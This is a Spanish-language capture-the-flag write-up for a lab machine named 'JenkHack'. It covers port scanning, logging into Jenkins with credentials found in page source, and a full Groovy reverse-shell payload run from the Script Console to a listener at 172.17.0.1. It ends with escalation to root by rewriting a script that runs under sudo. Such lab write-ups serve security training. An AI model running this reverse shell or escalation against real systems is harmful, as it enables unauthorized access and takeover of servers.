---
description: '✍️ Autor: d1se0  🔍 Dificultad: Fácil  📅 Fecha de creación: 05/09/2024'
---

# JenkHack

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (807).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (808).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 80** perteneciente al **servicio HTTP,** el **puerto 443** perteneciente al **servicio HTTPS** y el **puerto 8080** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p80,443,8080 -v 172.17.0.2
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (809).png" alt=""><figcaption></figcaption></figure>

Añadimos el dominio al fichero `/etc/hosts`. Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web llamada Hacker Nexus.

<figure><img src="../../.gitbook/assets/image (810).png" alt=""><figcaption></figcaption></figure>

Revisando el código fuente hay parece unas credenciales del usuario **admin**.

<figure><img src="../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>

Miramos el contenido del **puerto 8080** y hay un panel de Login de **Jenkins**. Ingresamos esas credenciales.

### 🚀 **EXPLOTACIÓN**

<figure><img src="../../.gitbook/assets/image (812).png" alt=""><figcaption></figcaption></figure>

Estamos dentro. Seleccionamos **manage jenkin**s y luego **script console** que nos permite enviar una reverse shell mediante **Groovy** mediante nos ponemos en escucha.

```
String host="172.17.0.1";int port=443;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

```
nc -nvlp 443
```

<figure><img src="../../.gitbook/assets/image (813).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos SUDO.

Indagando entre los directorios encontramos un archivo que descodificamos con este [página](https://gchq.github.io/CyberChef/#recipe=From\_Base85\('!-u',true,'z'\)\&input=QzFWOXVCbDghJ0NpKmB1RGZQ).

<figure><img src="../../.gitbook/assets/image (815).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con esas credenciales.

<figure><img src="../../.gitbook/assets/image (816).png" alt=""><figcaption></figcaption></figure>

Tenemos permisos SUDO con bash por lo que miramos como elevar los privilegios con esta [página](https://gtfobins.github.io/gtfobins/bash/). Hay un archivo en el directorio `/opt` llamado **bash.sh**. Borramos el archivo y editamos su contenido.

```bash
#!/bin/bash
whoami
/bin/bash
```

Le damos permiso al archivo.

```bash
chmod +x bash.sh
```

Ejecutamos.

```bash
sudo /usr/local/bin/bash
```

<figure><img src="../../.gitbook/assets/image (817).png" alt=""><figcaption></figcaption></figure>
